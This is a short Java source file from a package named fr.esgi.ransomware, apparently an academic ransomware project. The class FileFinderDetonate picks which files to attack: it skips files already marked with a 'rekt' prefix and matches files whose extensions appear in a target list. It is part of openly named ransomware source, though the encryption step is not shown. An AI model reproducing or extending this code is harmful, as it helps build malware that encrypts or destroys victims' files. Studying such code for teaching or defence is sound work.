package fr.esgi.ransomware.file_reader;

import java.io.File;
import java.util.Arrays;
import java.util.List;

import fr.esgi.ransomware.Util;

public class FileFinderDetonate extends FileFinder {
    private final List<String> extentionsToRekt;

    public FileFinderDetonate() {
        super();
        this.extentionsToRekt = Arrays.asList(Util.EXTENSIONS_TO_REKT);
    }


    @Override
    public boolean isFileMatch(File file) {
        String filename = file.getName();

        if (filename.startsWith(Util.PREFIX_FILE_REKT)) return false;

        int index = filename.lastIndexOf(".");
        if (index == -1 || index + 2 > filename.length()) return false;

        return extentionsToRekt.contains(filename.substring(index + 1).toUpperCase());
    }
}
